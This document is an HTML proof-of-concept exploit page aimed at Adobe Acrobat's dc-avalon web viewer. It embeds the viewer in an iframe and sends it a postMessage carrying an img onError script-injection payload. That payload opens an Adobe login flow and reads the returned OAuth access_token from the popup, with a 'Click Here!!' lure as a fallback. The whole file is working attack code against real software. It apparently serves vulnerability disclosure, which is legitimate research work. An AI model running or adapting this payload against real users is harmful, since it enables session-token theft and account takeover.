<html>
<head>
    <script>
        const iframe_payload = `window.exploit=function(){
            e=window.open(\`https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fadobeid%2Fdc-prod-virgoweb%2FAdobeID%2Ftoken%3Fredirect_uri%3D${encodeURIComponent('https://acrobat.adobe.com/dc-avalon/1.13.0/index.html')}\`);
            
            setInterval(function(){
                try{
                    o=new URLSearchParams(e.location.hash.slice(1));
                    if(o.has('access_token')){
                        alert(o.get('access_token'));
                        e.close();
                    }
                }catch(err){}
            },1000);
        },
        document.body.innerHTML=\`<a href='javascript:window.exploit()'>Click Here!!</a>\`;`;

        function exploit() {
            try{
                window.frames[0].postMessage({
                    "type":"AVALON_RENDER_CONTENT",
                    "html":"<img src=1 onError=\\"" + iframe_payload + "\\">"
                }, '*');
            }catch(e){}
        }

        // 🔥 ALWAYS show Click Here (fallback)
        window.onload = function(){
            document.body.insertAdjacentHTML(
                "afterbegin",
                "<a href='javascript:window.exploit()'>Click Here!!</a><br><br>"
            );

            // try iframe exploit as well
            setTimeout(exploit, 2000);
        }
    </script>
</head>

<body>
    <iframe 
        src="https://acrobat.adobe.com/dc-avalon/1.13.0/index.html"
        width="100%"
        height="600"
        style="border:none">
    </iframe>
</body>
</html>
